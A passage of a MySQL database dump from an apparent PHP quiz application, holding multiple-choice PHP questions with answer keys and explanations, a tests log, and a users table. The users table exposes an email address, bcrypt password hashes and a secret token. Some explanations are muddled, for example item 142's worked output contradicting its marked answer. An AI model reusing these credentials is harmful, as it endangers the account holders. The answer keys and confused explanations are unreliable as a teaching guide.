class=\"pun\">)</span></span></span></p>\r\n<p><span><span><span class=\"pun\"><uc:hed>Note:</uc:hed><span>&nbsp;The range of valid years in the mktime() function is limited to 1970 through 2038 before PHP 5.1.</span></span></span></span></p>','[{\"content\":\"<p><span>Jan-01-1996<\\/span><\\/p>\",\"correct\":1},{\"content\":\"<p><span>Date out of range error<\\/span><\\/p>\",\"correct\":0},{\"content\":\"<p><span>Fatal error<\\/span><\\/p>\",\"correct\":0},{\"content\":\"<p><span>Jan-01-1995<\\/span><\\/p>\",\"correct\":0}]',1,1,'2012-11-19 14:20:32','2012-11-19 14:21:12'),
	(139,12,28,'Which of the following code can be used t.....?','<p><span>Which of the following code can be used to create case insensitive constant?</span></p>\r\n<p><span><br /></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.&nbsp;</span><br /><br /><span>A constant can be defined by using the define() function. The define function is used to define a named constant. The syntax of the define function is as follows:</span></p>\r\n<p><span><span class=\"kwd\">bool</span><span class=\"pln\"> define </span><span class=\"pun\">(</span><span class=\"pln\"> </span><span class=\"kwd\">string</span><span class=\"pln\"> $name </span><span class=\"pun\">,</span><span class=\"pln\"> mixed $value </span><span class=\"pun\">[,</span><span class=\"pln\"> </span><span class=\"kwd\">bool</span><span class=\"pln\"> $case_insensitive </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"kwd\">false</span><span class=\"pln\"> </span><span class=\"pun\">]</span><span class=\"pln\"> </span><span class=\"pun\">)</span></span></p>\r\n<p><span><span class=\"pun\"><br /></span></span></p>\r\n<p><span><span class=\"pun\"><span>To define the case-sensitive constant, you will write the code like this:</span></span></span></p>\r\n<p><pre><?php\r\ndefine(\"GREETING\",\"How are you today?\");\r\necho constant(\"GREETING\");\r\n?></pre></p>\r\n<p><span><span class=\"pun\"><span><span>To define the case-insensitive constant, you will write the code like this:</span></span></span></span></p>\r\n<p><pre><?php\r\ndefine(\"GREETING\",\"How are you today?\",TRUE);\r\necho constant(\"greeting\");\r\n?></pre></p>\r\n<p><span><span class=\"pun\"><span><span><br /></span></span></span></span></p>\r\n<p><span><span class=\"pun\"><span><span><span>Reference:&nbsp;</span><a target=\"_blank\" href=\"http://php.net/manual/en/language.constants.php\" tabindex=\"-1\">http://php.net/manual/en/language.constants.php</a></span></span></span></span></p>','[{\"content\":\"<p>&lt;?php define(\\\"GREETING\\\",\\\"How are you today?\\\",TRUE); echo constant(\\\"greeting\\\"); ?&gt;<\\/p>\",\"correct\":1},{\"content\":\"<p>&lt;?php define(\\\"GREETING\\\",\\\"How are you today?\\\"); echo constant(\\\"greeting\\\"); ?&gt;<\\/p>\",\"correct\":0},{\"content\":\"<p>&lt;?php define(\\\"GREETING\\\",\\\"How are you today?\\\",FALSE); echo constant(\\\"greeting\\\"); ?&gt;<\\/p>\",\"correct\":0},{\"content\":\"<p>&lt;?php define(\\\"GREETING\\\",\\\"How are you today?\\\",\'USECASE\'); echo constant(\\\"greeting\\\"); ?&gt;<\\/p>\",\"correct\":0}]',1,1,'2012-11-19 14:20:32','2012-11-19 14:21:15'),
	(140,12,62,'You passed an associative array to the so.....) function. What will happen?','<p><span>You passed an associative array to the sort() function. What will happen?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option C is correct.</span><br /><br /><span>The elements of the array will be sorted and keys will not be preserved. The sort() function is used to sort a given array either alphabetically if any strings are present or numerically if all elements are numbers. However, a user cannot pass an associative array to the sort() function. The reason behind this is that the values of the array are sorted as expected but keys are replaced by numerical indices that follow the sort order. Consider the following example:</span></p>\r\n<p><span><pre><?php\r\n$array = array(\"a1\"=>x,\"a2\"=>e,\"a3\"=>z);\r\nsort( $array );\r\n \r\nforeach ( $array as $keys => $values ) {\r\nprint \"$keys = $values \";\r\n}\r\n?> </pre></span></p>\r\n<p><span><uc:hed>Output:&nbsp;</uc:hed><span>Here, the array keys will be lost, however, the elements will be sorted. Hence, the output will be as follows:</span></span></p>\r\n<p><span><span><span class=\"lit\">0</span><span class=\"pln\"> </span><span class=\"pun\">=</span><span class=\"pln\"> e </span><span class=\"lit\">1</span><span class=\"pln\"> </span><span class=\"pun\">=</span><span class=\"pln\">x </span><span class=\"lit\">2</span><span class=\"pln\"> </span><span class=\"pun\">=</span><span class=\"pln\"> z</span></span></span></p>\r\n<div class=\"clearfix\"><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://in2.php.net/manual/en/function.sort.php\" tabindex=\"-1\">http://in2.php.net/manual/en/function.sort.php</a></uc:ref></div>\r\n<p><span><span><span class=\"pln\"><br /></span></span></span></p>','[{\"content\":\"The key of the array will be sorted and the elements will not be sorted, however, they will be preserved.\",\"correct\":0},{\"content\":\"The elements of the array will be sorted and the keys will not be sorted, however, they will be preserved.\",\"correct\":0},{\"content\":\"The elements of the array will be sorted and keys will not be preserved.\",\"correct\":1},{\"content\":\"The keys will be sorted, however, elements will not be preserved.\",\"correct\":0}]',1,0,'2012-11-19 14:20:32','2012-11-19 14:21:17'),
	(141,13,1,'Consider the following script:','<div><span>Consider the&nbsp;</span><span>following</span><span>&nbsp;script:</span></div>\r\n<div><span><br /></span></div>\r\n<div>\r\n<title>This is a test script.</title>\r\n<pre><?php\r\n\r\n    echo \'This is some sample text\';\r\n\r\n?></pre></div>\r\n<div></div>\r\n<div><span>Which of the following tags is used in the php script?</span></div>','<p><b>Explanation:</b><span>&nbsp;Answer option D is correct.</span><br /><br /><span>In the above question, the standard php tag format is used, as shown below:</span></p>\r\n<p><pre><?php\r\n\r\n          /* Write your code here*/\r\n\r\n?></pre></p>\r\n<p><span><br /></span></p>\r\n<p><span><span>There are four types of tags available in the php language as follows:</span><br /></span></p>\r\n<ol>\r\n<li><uc:hed>Standard Tags:&nbsp;</uc:hed>These tags are the standard php tags, which are certainly available and cannot be disabled by changing the php.conf file. The syntax of standard tags is as follows:<br /><br /><pre><?php\r\n\r\n      //code\r\n\r\n?></pre><br />&nbsp;</li>\r\n<li><uc:hed>Short Tags:&nbsp;</uc:hed><span><span>These tags are simple to use but can interfere with XML documents. The syntax of short tags is as follows:<br /><br /></span></span><pre><?\r\n      //code\r\n?></pre><span><span>or</span></span><pre><?= $variable ?></pre><span><br /><br /><span>(It can be used to print the result of an expression directly in the output of the script.)</span></span></li>\r\n<li><span><uc:hed>Script Tags:&nbsp;</uc:hed><span>These are simple HTML language tags. The syntax of script tags is as follows:<br /><br /><br />&nbsp;</span></span></li>\r\n<li><span><span><span><uc:hed>ASP Tags:&nbsp;</uc:hed><span>These are simple ASP tags. The syntax of ASP tags is as follows:</span><br /><br /><br /></span></span></span><pre><%\r\n      //code\r\n%></pre></li>\r\n</ol>\r\n<p><span><br /></span></p>','[{\"content\":\"<p>ASP tag<\\/p>\",\"correct\":0},{\"content\":\"<p><span>Script tag<\\/span><\\/p>\",\"correct\":0},{\"content\":\"<p><span>Short tag<\\/span><\\/p>\",\"correct\":0},{\"content\":\"<p>Standard Tag<\\/p>\",\"correct\":1}]',1,0,'2012-11-19 23:59:40','2012-11-19 23:59:49'),
	(142,13,76,'What will be the output of the following .....3,6),array(4,5,6));\r\n?>','<p><span>What will be the output of the following PHP code?</span></p>\r\n<p><span><pre><?php\r\narray_combine(array(1,2,3,6),array(4,5,6));\r\n?></pre></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option D is correct.</span><br /><br /><span>The array_combine() function is used to combine two arrays. It uses the first array as a key and the second array as a value. For example,</span><br /><br /><span>You want to run the following PHP code:</span></p>\r\n<p><span><span class=\"pln\">array_combine</span><span class=\"pun\">(</span><span class=\"pln\">array</span><span class=\"pun\">(</span><span class=\"lit\">1</span><span class=\"pun\">,</span><span class=\"lit\">2</span><span class=\"pun\">,</span><span class=\"lit\">3</span><span class=\"pun\">,</span><span class=\"lit\">6</span><span class=\"pun\">),</span><span class=\"pln\">array</span><span class=\"pun\">(</span><span class=\"lit\">4</span><span class=\"pun\">,</span><span class=\"lit\">5</span><span class=\"pun\">,</span><span class=\"lit\">6</span><span class=\"pun\">));</span></span></p>\r\n<p><span><span class=\"pun\"><br /></span></span></p>\r\n<p><span><span class=\"pun\"><span>Here, the php_combine() function creates an array by using one array for keys and another for its values and gives the following array as the output:</span></span></span></p>\r\n<p><span><span class=\"pun\"><span><span class=\"pln\">array</span><span class=\"pun\">(</span><span class=\"lit\">1</span><span class=\"pun\">=&gt;</span><span class=\"lit\">4</span><span class=\"pun\">,</span><span class=\"lit\">2</span><span class=\"pun\">=&gt;</span><span class=\"lit\">5</span><span class=\"pun\">,</span><span class=\"lit\">3</span><span class=\"pun\">=&gt;</span><span class=\"lit\">6</span><span class=\"pun\">)</span></span></span></span></p>\r\n<p><span><span class=\"pun\"><span><span class=\"pun\"><br /></span></span></span></span></p>\r\n<p><span><span class=\"pun\"><span><span class=\"pun\"><uc:kwd>Note: Both parameters of the array_combine() function should have an equal number of elements, otherwise it will produce a warning message.</uc:kwd><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://in2.php.net/manual/en/function.array-combine.php\" tabindex=\"-1\">http://in2.php.net/manual/en/function.array-combine.php</a></uc:ref></span></span></span></span></p>','[{\"content\":\"array(1,2,3,4,5,6)\",\"correct\":0},{\"content\":\"array(1=>4,2=>5,3=>6)\",\"correct\":0},{\"content\":\"array(1=>2,3=>4,5=>6)\",\"correct\":0},{\"content\":\"Warning message\",\"correct\":1}]',1,0,'2012-11-19 23:59:40','2012-11-19 23:59:52'),
	(143,13,38,'What is the output of the following code .....function(40) + $c;\r\n?> ','<p><span>What is the output of the following code snippet?</span></p>\r\n<p><span><br /></span></p>\r\n<p><span><pre><?php\r\n$a = 20;\r\nfunction myfunction($b) {\r\n    $a = 30;\r\n    global $a, $c;\r\n    return $c = ($b + $a);\r\n}\r\nprint myfunction(40) + $c;\r\n?> </pre></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>In this question, comments are explaining code:</span></p>\r\n<p><span><pre><?php\r\n$a = 20;\r\nfunction myfunction($b) {\r\n    $a = 30;\r\n    global $a, $c;\r\n    return $c = ($b + $a); //40+ 20 (global)\r\n}\r\nprint myfunction(40) + $c; //60+60 ($c = global) \r\n?></pre></span></p>','[{\"content\":\"<p>120<\\/p>\",\"correct\":1},{\"content\":\"<p><span>Syntax Error<\\/span><\\/p>\",\"correct\":0},{\"content\":\"<p>200<\\/p>\",\"correct\":0},{\"content\":\"<p>60<\\/p>\",\"correct\":0},{\"content\":\"<p>70<\\/p>\",\"correct\":0}]',1,0,'2012-11-19 23:59:40','2012-11-19 23:59:54'),
	(144,13,73,'What will be the output of the given PHP .....$key = $val\\n\";\r\n}\r\n ?>','<p><span>What will be the output of the given PHP code?</span></p>\r\n<p><span><pre><?php\r\n$name = array(\"d\" => \"Mark\", \"a\" => \"David\", \"b\" => \"Peter\", \"c\" => \"Martha\");\r\n$nameArrayObject = new ArrayObject($name);\r\n$nameArrayObject->ksort();\r\n \r\nforeach ($nameArrayObject as $key => $val) {\r\n    echo \"$key = $val\\n\";\r\n}\r\n ?></pre></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The ArrayObject::ksort() function accepts an associative array and sorts its keys alphabetically if any strings are present, or numerically if all elements are numbers. However, it does not sort the elements of the associative array.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://in2.php.net/manual/en/arrayobject.ksort.php\" tabindex=\"-1\">http://in2.php.net/manual/en/arrayobject.ksort.php</a></uc:ref></p>','[{\"content\":\"a = David b = Peter c = Martha d = Mark\",\"correct\":1},{\"content\":\"a = David b = Mark c = Martha d = Peter\",\"correct\":0},{\"content\":\"a = Mark b = David c = Peter d = Martha\",\"correct\":0},{\"content\":\"The script will throw an error message.\",\"correct\":0}]',1,0,'2012-11-19 23:59:40','2012-11-19 23:59:57'),
	(145,13,58,'Which of the following functions will you.....ect by preserving key values?','<p><span>Which of the following functions will you use to sort the values of an array object by preserving key values?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option B is correct.</span><br /><br /><span>The ArrayObject::asort method is used to sort the values of an array object. For example:</span></p>\r\n<p><span><pre><?php\r\n$ArrayObject = new ArrayObject($fruits);\r\n$ArrayObject->asort();\r\n?></pre></span></p>\r\n<p><span><span>Answer options A, C, and D are incorrect. ArrayObject::keysort is used to sort by keys. ArrayObject::sort and ArrayObject::rsort do not preserve key values.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://php.net/manual/en/arrayobject.asort.php\" tabindex=\"-1\">http://php.net/manual/en/arrayobject.asort.php</a></uc:ref></span></p>','[{\"content\":\"ArrayObject::keysort\",\"correct\":0},{\"content\":\"ArrayObject::asort\",\"correct\":1},{\"content\":\"ArrayObject::sort\",\"correct\":0},{\"content\":\"ArrayObject::rsort\",\"correct\":0}]',1,0,'2012-11-19 23:59:40','2012-11-20 00:00:00'),
	(146,13,21,'You run the following PHP script:','<p><span>You run the following PHP script:</span></p>\r\n<p><span><br /></span></p>\r\n<p><span><pre><?php\r\nfunction calc()\r\n{\r\n    $x=10;\r\n    $b=++$x;\r\n    print($b);\r\n}\r\ncalc();\r\n?></pre></span></p>\r\n<p><span><br /></span></p>\r\n<p><span><span>What will be the value of the variable b?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option C is correct.</span><br /><br /><span>The increment operator is a unary operator. Its sign is ++. It displays two different behaviors depending on the position of the operator. The two behaviors are as follows:</span><br /><br /></p>\r\n<ol>\r\n<li>x++</li>\r\n<li>++x</li>\r\n</ol>\r\n<p><span>Both of the above statements mean x=x+1. But when these are assigned to a variable, the meaning is changed. Let us see this in the following example:</span><br /><br /><span>Suppose the value of x=10, then in the statement b=++x, the value of variables x and b will be 11. It is so because b=++x contains two statements:</span><br /><br /></p>\r\n<ol>\r\n<li>b=x</li>\r\n<li>x=x+1</li>\r\n</ol>\r\n<p><span>Since the statement executes from left to right and the ++ operator has more priority than the = operator, first x will be incremented to one, and then its value will be assigned to b.</span><br /><br /><span>In case of the statement b=x++, the value of b will be 10 and the value of x will be 11 because b=x++ contains two statements.</span><br /><br /></p>\r\n<ol>\r\n<li>b=x</li>\r\n<li>x=x+1</li>\r\n</ol>\r\n<p><span>In this case, when the statement executes from left to right, it comes in contact with the variable x. The value of x is assigned to b and x is incremented to 1.</span></p>','[{\"content\":\"<p>10<\\/p>\",\"correct\":0},{\"content\":\"<p>9<\\/p>\",\"correct\":0},{\"content\":\"<p>11<\\/p>\",\"correct\":1},{\"content\":\"<p>8<\\/p>\",\"correct\":0},{\"content\":\"<p><span>The script will throw an error message.<\\/span><\\/p>\",\"correct\":0}]',1,1,'2012-11-19 23:59:40','2012-11-20 00:00:05'),
	(147,13,27,'Which of the following files can be used .....to modify PHP configurations?','<p><span>Which of the following files can be used to modify PHP configurations?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.&nbsp;</span><br /><span>The php.ini file is a configuration file in PHP that is used to customize behavior of PHP at runtime. It can customize various settings such as upload directory, register global variables, display errors, log errors, max uploading size setting, and maximum time to execute a script and other configurations. According to php.net, php.ini can be searched in the following locations:</span></p>\r\n<ul>\r\n<li>SAPI module specific location (PHPIniDir directive in Apache 2, -c command line option in CGI and CLI, php_ini parameter in NSAPI, PHP_INI_PATH environment variable in THTTPD)</li>\r\n<li>The PHPRC environment variable.</li>\r\n<li>As of PHP 5.2.0, the location of the php.ini file can be set for different versions of PHP. The following registry keys are examined in order: [HKEY_LOCAL_MACHINE\\SOFTWARE\\PHP\\x.y.z], [HKEY_LOCAL_MACHINE\\SOFTWARE\\PHP\\x.y] and [HKEY_LOCAL_MACHINE\\SOFTWARE\\PHP\\x], where x, y and z mean the PHP major, minor and release versions. If there is a value for IniFilePath in any of these keys, the first one found will be used as the location of the php.ini (Windows only).<br />[HKEY_LOCAL_MACHINE\\SOFTWARE\\PHP], value of IniFilePath (Windows only).<br />Current working directory (except CLI).</li>\r\n</ul>\r\n<p><span>Answer options B, C, and D are incorrect. These are not valid file settings.&nbsp;</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://www.php.net/manual/en/ini.list.php\" tabindex=\"-1\">http://www.php.net/manual/en/ini.list.php</a></uc:ref></p>','[{\"content\":\"<p><span>php.ini<\\/span><\\/p>\",\"correct\":1},{\"content\":\"<p><span>isset.ini<\\/span><\\/p>\",\"correct\":0},{\"content\":\"<p><span>httpd_php.conf<\\/span><\\/p>\",\"correct\":0},{\"content\":\"<p><span>config.ini<\\/span><\\/p>\",\"correct\":0}]',1,0,'2012-11-19 23:59:40','2012-11-20 00:00:07'),
	(148,13,68,'What will be the output of the following .....a;\r\nprint($f + $e);\r\n?>','<p><span>What will be the output of the following code snippet?</span></p>\r\n<p><span><pre><?php\r\n$a = 1;\r\n$b = 2;\r\n$c = 0xAF;\r\n$d = $b + $c;\r\n$e = $d * $b;\r\n$f = ($d + $e) % $a;\r\nprint($f + $e);\r\n?></pre></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The output of the above script will be 354. The step by step output of the code will be as follows:</span></p>\r\n<p><span><pre><?php\r\n$a = 1;\r\n$b = 2;\r\n$c = 0xAF; //The numeric value of $c will be 175.\r\n$d = $b + $c; //The value of $d will be 177.\r\n$e = $d * $b; //The value of $e will be 354.\r\n$f = ($d + $e) % $a; //The value of $f will be 0.\r\nprint($f + $e); // The printed output will be 354.\r\n?></pre></span></p>','[{\"content\":\"354\",\"correct\":1},{\"content\":\"The script will throw an error message\",\"correct\":0},{\"content\":\"0\",\"correct\":0},{\"content\":\"200\",\"correct\":0}]',1,0,'2012-11-19 23:59:40','2012-11-20 00:00:11'),
	(149,13,42,'Which one of the following four logical o.....erators of PHP is not binary?','<p><span>Which one of the following four logical operators of PHP is not binary?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>Logical NOT is unary but not binary operator.&nbsp;</span><br /><br /><span>Answer option B is incorrect. The AND operator is a binary operator.</span><br /><br /><span>Answer option C is incorrect. The OR operator is a binary operator.</span><br /><br /><span>Answer option D is incorrect. The XOR operator is a binary operator.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://php.net/manual/en/language.operators.logical.php\" tabindex=\"-1\">http://php.net/manual/en/language.operators.logical.php</a></uc:ref></p>','[{\"content\":\"<p><span>NOT<\\/span><\\/p>\",\"correct\":1},{\"content\":\"<p><span>AND<\\/span><\\/p>\",\"correct\":0},{\"content\":\"<p>OR<\\/p>\",\"correct\":0},{\"content\":\"<p>XOR<\\/p>\",\"correct\":0}]',1,0,'2012-11-19 23:59:40','2012-11-20 00:00:13'),
	(150,13,31,'What is the value of $x in the following .....\r\n$x = 123 == 0123;\r\n?>','<p><span>What is the value of $x in the following code snippet?</span></p>\r\n<p><span><br /></span></p>\r\n<p><span><pre><?php\r\n$x = 123 == 0123;\r\n?></pre></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option B is correct.</span><br /><br /><span>There are four types of equivalence operations in the PHP language:</span></p>\r\n<ul>\r\n<li><uc:hed>Equivalence Operation (==):&nbsp;</uc:hed>It evaluates to true if the two operands are equivalent, i.e., they can be converted to a common data type in which they have the same value but are not necessarily of the same type.</li>\r\n<li><uc:hed>Identity Operation (===):&nbsp;</uc:hed>It evaluates to true only if the operands are of the same data type and have the same value.</li>\r\n<li><uc:hed>Not-equivalent Operation (!=):&nbsp;</uc:hed>It evaluates to true if the two operands are not equivalent, without regards to their data type.</li>\r\n<li><uc:hed>Not-identical Operation (!==):&nbsp;</uc:hed>It evaluates to true if the two operands are not of the same data type or do not have the same value.</li>\r\n</ul>\r\n<p><span>In this question, 123 is not equal to 0123, since PHP treats 0123 as octal notification.</span><br /><br /><uc:ref>Reference: PHP Manual,&nbsp;<a target=\"_blank\" href=\"http://php.net/manual/en/language.operators.comparison.php\" tabindex=\"-1\">http://php.net/manual/en/language.operators.comparison.php</a></uc:ref></p>','[{\"content\":\"<p><span>TRUE<\\/span><\\/p>\",\"correct\":0},{\"content\":\"<p><span>FALSE<\\/span><\\/p>\",\"correct\":1},{\"content\":\"<p><span>NULL<\\/span><\\/p>\",\"correct\":0},{\"content\":\"<p>123<\\/p>\",\"correct\":0}]',1,1,'2012-11-19 23:59:40','2012-11-20 00:00:16');

/*!40000 ALTER TABLE `testquestions` ENABLE KEYS */;
UNLOCK TABLES;


# Dump of table tests
# ------------------------------------------------------------

DROP TABLE IF EXISTS `tests`;

CREATE TABLE `tests` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` int(10) unsigned NOT NULL,
  `questions` int(11) NOT NULL,
  `finished` int(11) NOT NULL,
  `start_time` datetime NOT NULL,
  `finish_time` datetime NOT NULL,
  `created_at` datetime NOT NULL,
  `updated_at` datetime NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

LOCK TABLES `tests` WRITE;
/*!40000 ALTER TABLE `tests` DISABLE KEYS */;

INSERT INTO `tests` (`id`, `user_id`, `questions`, `finished`, `start_time`, `finish_time`, `created_at`, `updated_at`)
VALUES
	(11,1,10,1,'2012-11-19 00:11:19','2012-11-19 00:16:19','2012-11-19 00:11:19','2012-11-19 00:11:39'),
	(12,1,10,1,'2012-11-19 14:20:32','2012-11-19 14:25:32','2012-11-19 14:20:32','2012-11-21 20:14:49'),
	(13,13,10,0,'2012-11-19 23:59:40','2012-11-20 00:04:40','2012-11-19 23:59:40','2012-11-20 00:00:16');

/*!40000 ALTER TABLE `tests` ENABLE KEYS */;
UNLOCK TABLES;


# Dump of table users
# ------------------------------------------------------------

DROP TABLE IF EXISTS `users`;

CREATE TABLE `users` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `active` tinyint(1) NOT NULL,
  `group_id` int(10) unsigned NOT NULL,
  `email` varchar(128) NOT NULL,
  `password` varchar(64) NOT NULL,
  `secret` varchar(32) NOT NULL DEFAULT '',
  `name` varchar(64) NOT NULL,
  `surname` varchar(64) NOT NULL,
  `level` int(11) NOT NULL,
  `created_at` datetime NOT NULL,
  `updated_at` datetime NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `users_email_unique` (`email`),
  KEY `users_group_id_foreign` (`group_id`),
  CONSTRAINT `users_group_id_foreign` FOREIGN KEY (`group_id`) REFERENCES `groups` (`id`) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;

INSERT INTO `users` (`id`, `active`, `group_id`, `email`, `password`, `secret`, `name`, `surname`, `level`, `created_at`, `updated_at`)
VALUES
	(1,1,1,'saimaz','$2a$08$c9NI97pz/.GlzDjkI0rCC.7JmG4SGaLMPAH0HH22I/nKyKQ5AAkBS','','Simonas','S',10,'0000-00-00 00:00:00','0000-00-00 00:00:00'),
	(13,1,3,'simonass@nfq.lt','$2a$08$93Da9JGCAriItZvpMMwNgek2PdI5kdptrXNUC9mrL4yycnrD9//qS','c3620839577573bba45acac8566f7dd9','','',0,'2012-11-19 21:13:06','2012-11-19 21:15:29');

/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;



/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;
/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
